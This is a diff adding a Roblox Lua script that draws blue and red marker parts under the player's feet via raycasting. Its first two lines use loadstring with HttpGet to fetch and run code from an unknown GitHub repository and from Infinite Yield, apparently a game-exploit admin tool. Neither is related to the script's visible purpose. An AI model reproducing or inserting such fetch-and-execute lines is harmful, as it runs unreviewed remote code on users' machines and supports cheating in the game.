@@ -1,0 +1,54 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Yuzei03/erujrej/main/erjnmmnj'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local leftFoot = character:WaitForChild("LeftFoot")
+local rightFoot = character:WaitForChild("RightFoot")
+
+-- Create parts to represent the feet
+local leftFootPart = Instance.new("Part")
+leftFootPart.Size = Vector3.new(2, 1, 2) -- Larger size
+leftFootPart.BrickColor = BrickColor.new("Bright blue")
+leftFootPart.Anchored = true
+leftFootPart.CanCollide = false
+leftFootPart.Parent = workspace
+
+local rightFootPart = Instance.new("Part")
+rightFootPart.Size = Vector3.new(2, 1, 2) -- Larger size
+rightFootPart.BrickColor = BrickColor.new("Bright red")
+rightFootPart.Anchored = true
+rightFootPart.CanCollide = false
+rightFootPart.Parent = workspace
+
+local function keepFeetOnGround()
+    while true do
+        if character and humanoidRootPart and leftFoot and rightFoot then
+            -- Get the position of the left foot
+            local leftFootPosition = leftFoot.Position
+            local leftRay = Ray.new(leftFootPosition, Vector3.new(0, -100, 0))
+            local leftHit, leftPosition = workspace:FindPartOnRay(leftRay, character)
+
+            if leftHit then
+                -- Adjust the left foot part position to keep it at the ground level
+                leftFootPart.CFrame = CFrame.new(leftPosition + Vector3.new(0, leftFootPart.Size.Y / 2, 0))
+            end
+
+            -- Get the position of the right foot
+            local rightFootPosition = rightFoot.Position
+            local rightRay = Ray.new(rightFootPosition, Vector3.new(0, -100, 0))
+            local rightHit, rightPosition = workspace:FindPartOnRay(rightRay, character)
+
+            if rightHit then
+                -- Adjust the right foot part position to keep it at the ground level
+                rightFootPart.CFrame = CFrame.new(rightPosition + Vector3.new(0, rightFootPart.Size.Y / 2, 0))
+            end
+        end
+
+        wait() -- No delay
+    end
+end
+
+-- Start the function in a separate thread
+spawn(keepFeetOnGround)
